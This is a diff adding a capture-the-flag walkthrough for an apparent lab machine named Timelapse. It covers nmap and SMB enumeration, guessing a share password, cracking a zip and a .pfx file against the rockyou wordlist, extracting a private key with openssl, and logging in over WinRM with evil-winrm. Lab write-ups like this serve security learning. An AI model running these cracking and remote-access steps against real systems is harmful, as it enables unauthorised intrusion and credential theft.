@@ -1,0 +1,73 @@
+Timelapse
+
+#Started with nmap scan of IP
+nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan 10.10.11.152 
+
+#Got to know that many ports are open of which port 445 interested me as it is reserved for smb
+
+smbmap -u guest -p "" -H 10.10.11.152
+
+#The above command gave me the smb shares of the machine of which just 'Shares' is accessible.
+
+
+#Accessing Shares. It is password protected but tried the default passwords like admin or root and it worked with admin
+
+smbclient \\\\10.10.11.152\\Shares
+
+
+#Got to know there are 2 directories Dev and HelpDesk. Downloaded all files to local kali machine. In the Dev directory there's a password protected zipfile. Used zip2john and john to crack the password of the zip file. Wordlist used: /usr/share/wordlists/rockyou.txt
+
+
+#I found a .pfx file
+
+PFX file is a encrypted security file that stores secure certificates used to authenticate a person or device, such as a computer or web server. It requires a password to be opened. 
+
+
+Searched google for cracking pfx file and got to know about a tool which extracts the public key and certificates from pfx file. The tool is called as crackpkcs12
+
+Used github to download the tool
+
+git clone https://github.com/crackpkcs12/crackpkcs12.git
+
+Navigate to the directory and install the tool using the following command
+
+./configure;make;make install
+
+Before installing the tool please install libssl-dev library. We can install this using the following command
+
+apt-get install -y libssl-dev
+
+Exploitation:
+
+To extract certificates using crackpkcs use the following command
+
+crackpkcs12 -d dictionary.txt .pfx file 
+
+For Example
+
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
+
+
+The above command gave us the password to open the file.
+
+
+
+
+Extracting private key and certificate from .pfx file
+
+Extracting certificate
+openssl pkcs12 -in {.pfx file} -out cert.pem
+
+openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem
+
+
+Extracting private key 
+
+openssl pkcs12 -in {.pfx_file} -nocerts -nodes -out key.pem
+
+
+Used both the keys and evil-winrm tool to connect to the machine
+
+evil-winrm -i 10.10.11.152 -S -c cert.pem -key.pem
+
+Connected to the machine and enumerated a little bit. The user flag was found on Desktop
